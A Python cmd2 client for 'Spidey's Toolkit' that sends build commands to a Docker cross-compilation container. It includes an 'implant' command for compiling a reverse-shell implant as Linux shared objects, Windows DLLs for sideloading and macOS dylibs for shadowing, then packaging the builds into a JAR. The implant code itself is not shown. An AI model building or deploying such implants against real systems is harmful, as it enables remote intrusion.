#!/usr/bin/env python3
"""
Spidey's Toolkit — Build Client

Run as: python3 -m spideys_toolkit.client

Host-side cmd2 shell that dispatches build commands to the Docker
container acting as the central compilation machine. All compilation
happens inside the container where all cross-compiler toolchains are
installed. Build artifacts are written to the shared ./output/ volume
on the host.

Usage:
    python3 -m spideys_toolkit.client              # Interactive shell
    python3 -m spideys_toolkit.client compile arm   # One-shot command

By Oblivion Edge Vulnerabilty Research LLC, Copyright (c) November 16 2026

"""

import os
import subprocess
import sys

import cmd2


CONTAINER_NAME = 'spideys-toolkit-server'
OUTPUT_DIR = os.path.join(os.getcwd(), 'output')


def _detect_docker_cmd():
    """Detect whether docker requires sudo by checking socket access."""
    docker_sock = '/var/run/docker.sock'

    # Current user can access docker directly
    if os.path.exists(docker_sock) and os.access(docker_sock, os.R_OK | os.W_OK):
        return ['docker']

    # Already running as root (e.g., sudo python3 -m ...)
    if os.geteuid() == 0:
        return ['docker']

    # Need sudo — cache credentials upfront so cmd2 isn't interrupted
    print("\033[91m[spidey]\033[0m Docker socket requires elevated access.")
    print("\033[94m[spidey]\033[0m Tip: run \033[97msudo usermod -aG docker $USER && newgrp docker\033[0m to fix permanently.")
    print("\033[94m[spidey]\033[0m Caching sudo credentials for this session...\n")
    try:
        subprocess.run(['sudo', '-v'], timeout=30)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        print("\033[91m[spidey]\033[0m Warning: sudo auth failed. Docker commands may not work.")
    return ['sudo', 'docker']


class SpideysClient(cmd2.Cmd):
    """
    cmd2 client that dispatches build commands to the Docker container.
    Build artifacts persist in ./output/ on the host.
    """

    def __init__(self):
        super().__init__(
            persistent_history_file=os.path.expanduser('~/.spideys_client_history'),
        )
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self._docker_cmd = _detect_docker_cmd()
        docker_label = ' '.join(self._docker_cmd)

        # Spider-Man themed banner
        self.intro = (
            "\n"
            "\033[91m  ╔═══════════════════════════════════════╗\033[0m\n"
            "\033[91m  ║\033[0m \033[94m  ~ Spidey's Toolkit ~  Build Client \033[0m \033[91m║\033[0m\n"
            "\033[91m  ╚═══════════════════════════════════════╝\033[0m\n"
            "\033[97m  With great power comes great compilation.\033[0m\n"
            "\n"
            "  Container: \033[94m" + CONTAINER_NAME + "\033[0m\n"
            "  Docker:    \033[94m" + docker_label + "\033[0m\n"
            "  Output:    \033[94m" + OUTPUT_DIR + "\033[0m\n"
            "  Type \033[97m'help'\033[0m for available commands.\n"
        )

        self.prompt = '\033[91mspidey\033[94m@\033[97mclient\033[91m>\033[0m '

    # -------------------------------------------------------------------
    # Docker helpers
    # -------------------------------------------------------------------

    def _container_running(self) -> bool:
        """Check if the Docker container is running."""
        try:
            result = subprocess.run(
                self._docker_cmd + ['inspect', '-f', '{{.State.Running}}', CONTAINER_NAME],
                capture_output=True, text=True, timeout=5
            )
            return result.stdout.strip() == 'true'
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _exec_in_container(self, command: str) -> tuple:
        """Execute a command inside the Docker container."""
        if not self._container_running():
            return (1, '', 'Container "%s" is not running.\n'
                    'Start it with: sudo docker compose up -d' % CONTAINER_NAME)
        try:
            result = subprocess.run(
                self._docker_cmd + ['exec', CONTAINER_NAME, 'bash', '-c', command],
                capture_output=True, text=True, timeout=300
            )
            return (result.returncode, result.stdout, result.stderr)
        except subprocess.TimeoutExpired:
            return (1, '', 'Command timed out after 300 seconds')

    def _run_build_command(self, cmd_str: str):
        """Run a spideys_toolkit command inside the container."""
        full_cmd = (
            'cd /workspace && '
            'python3 -m spideys_toolkit %s' % cmd_str
        )
        returncode, stdout, stderr = self._exec_in_container(full_cmd)
        if stdout:
            self.poutput(stdout.rstrip())
        if stderr:
            self.perror(stderr.rstrip())
        return returncode == 0

    # -------------------------------------------------------------------
    # Commands
    # -------------------------------------------------------------------

    compile_parser = cmd2.Cmd2ArgumentParser()
    compile_parser.add_argument('arch', nargs='?', default='x86_64',
                                help='Target architecture')
    compile_parser.add_argument('mode', nargs='?', default='debug',
                                help='Build mode (debug/release)')

    @cmd2.with_argparser(compile_parser)
    def do_compile(self, args):
        """Compile shared objects inside the Docker build server."""
        self.poutput("\033[94mSpinning web for %s...\033[0m" % args.arch)
        self._run_build_command('compile %s %s' % (args.arch, args.mode))

    implant_parser = cmd2.Cmd2ArgumentParser()
    implant_parser.add_argument('arch', nargs='?', default='x86_64',
                                help='Target architecture')
    implant_parser.add_argument('mode', nargs='?', default='release',
                                help='Build mode (debug/release)')

    @cmd2.with_argparser(implant_parser)
    def do_implant(self, args):
        """Compile the implant (reverse shell) for a target architecture.

        Examples:
            implant win_dll release       Windows DLL for sideloading
            implant darwin_dylib release  macOS dylib for shadowing
            implant arm release           ARM shared object
            implant x86_64                x86-64 shared object
        """
        self.poutput("\033[91mWeaving implant for %s...\033[0m" % args.arch)
        self._run_build_command('implant %s %s' % (args.arch, args.mode))

    def do_package(self, _):
        """Package all built artifacts into a JAR inside the container."""
        self.poutput("\033[94mWeb-wrapping into JAR...\033[0m")
        self._run_build_command('package')

    def do_clean(self, _):
        """Clean all build artifacts in the container."""
        self._run_build_command('clean')

    def do_status(self, _):
        """Show build status from the container."""
        self._run_build_command('status')

    def do_container_status(self, _):
        """Check if the Docker build server is running."""
        if self._container_running():
            self.poutput("\033[92mContainer '%s' is running.\033[0m" % CONTAINER_NAME)
            _, stdout, _ = self._exec_in_container(
                'echo "=== Installed Toolchains ===" && '
                'which gcc && gcc --version | head -1 && '
                'which aarch64-linux-gnu-gcc 2>/dev/null && '
                'which mips-linux-gnu-gcc 2>/dev/null && '
                'which riscv64-linux-gnu-gcc 2>/dev/null && '
                'which x86_64-w64-mingw32-gcc 2>/dev/null && '
                'echo "=== Java ===" && java -version 2>&1 | head -1'
            )
            if stdout:
                self.poutput(stdout.rstrip())
        else:
            self.perror(
                "Container '%s' is NOT running.\n"
                "Start it with: docker compose up -d" % CONTAINER_NAME
            )

    def do_start(self, _):
        """Start the Docker build server (docker compose up -d)."""
        self.poutput("\033[94mSpinning up the web...\033[0m")
        try:
            subprocess.run(self._docker_cmd + ['compose', 'up', '-d'], timeout=120)
            self.poutput("\033[92mBuild server ready.\033[0m")
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            self.perror("Failed to start: %s" % e)

    def do_stop(self, _):
        """Stop the Docker build server (docker compose down)."""
        self.poutput("\033[97mRetracting web...\033[0m")
        try:
            subprocess.run(self._docker_cmd + ['compose', 'down'], timeout=60)
            self.poutput("\033[97mWeb retracted. Artifacts remain in ./output/\033[0m")
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            self.perror("Failed to stop: %s" % e)

    def do_shell(self, line):
        """Run a raw shell command inside the container."""
        if not line:
            self.perror("Usage: shell <command>")
            return
        _, stdout, stderr = self._exec_in_container(line)
        if stdout:
            self.poutput(stdout.rstrip())
        if stderr:
            self.perror(stderr.rstrip())

    def do_list_output(self, _):
        """List build artifacts in the ./output/ directory on the host."""
        if not os.path.isdir(OUTPUT_DIR):
            self.poutput("No output directory found.")
            return
        for root, dirs, files in os.walk(OUTPUT_DIR):
            level = root.replace(OUTPUT_DIR, '').count(os.sep)
            indent = '  ' * level
            self.poutput('%s%s/' % (indent, os.path.basename(root)))
            sub_indent = '  ' * (level + 1)
            for f in sorted(files):
                fp = os.path.join(root, f)
                size_kb = os.path.getsize(fp) / 1024.0
                self.poutput('%s%s (%.1f KB)' % (sub_indent, f, size_kb))

    def do_build_all(self, _):
        """Compile for all architectures in release mode."""
        archs = ['x86_64', 'arm', 'mips', 'riscv64', 'win_dll']
        for arch in archs:
            self.poutput("\n\033[91m--- Spinning web for %s ---\033[0m" % arch)
            success = self._run_build_command('compile %s release' % arch)
            if not success:
                self.perror("Build failed for %s, continuing..." % arch)
        self.poutput("\n\033[94m--- Web-wrapping into JAR ---\033[0m")
        self._run_build_command('package')

    def do_info(self, _):
        """Show client/server architecture information."""
        self.poutput("""
\033[91m  ~ Spidey's Toolkit ~\033[0m \033[94mClient/Server Architecture\033[0m
\033[97m  With great power comes great compilation.\033[0m

\033[91mClient (Host):\033[0m
  python3 -m spideys_toolkit.client
  Dispatches commands to Docker container
  Reads build artifacts from ./output/

\033[94mServer (Docker Container):\033[0m
  python3 -m spideys_toolkit.daemon
  All cross-compiler toolchains installed
  Compiles for: x86_64, ARM64, MIPS, RISC-V, Windows DLL, macOS dylib

\033[91mSupported Architectures:\033[0m
  x86_64       - Native GCC, Linux .so
  arm          - aarch64-linux-gnu-gcc, Linux .so
  mips         - mips-linux-gnu-gcc, Linux .so
  riscv64      - riscv64-linux-gnu-gcc, Linux .so
  win_dll      - x86_64-w64-mingw32-gcc, Windows .dll (sideloading)
  darwin_dylib - gcc/clang -dynamiclib, macOS .dylib (shadowing)

\033[94mWorkflow:\033[0m
  1. start          - Spin up the web (Docker container)
  2. compile <arch>  - Shoot a web at target architecture
  3. package         - Web-wrap into multi-arch JAR
  4. list_output     - View caught artifacts on host
  5. stop            - Retract the web (artifacts persist)
""")


def main():
    app = SpideysClient()
    if len(sys.argv) > 1:
        app.onecmd(' '.join(sys.argv[1:]))
    else:
        app.cmdloop()


if __name__ == '__main__':
    main()
